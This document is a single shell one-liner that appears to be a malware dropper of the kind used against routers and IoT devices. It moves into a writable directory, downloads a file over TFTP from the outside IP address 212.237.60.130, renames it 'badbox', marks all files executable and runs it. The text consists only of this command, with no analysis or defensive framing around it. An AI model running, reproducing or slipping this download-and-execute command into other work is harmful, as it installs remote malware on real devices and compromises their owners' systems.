cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 212.237.60.130 -c get bash;cat bash >badbox;chmod +x *;./badbox
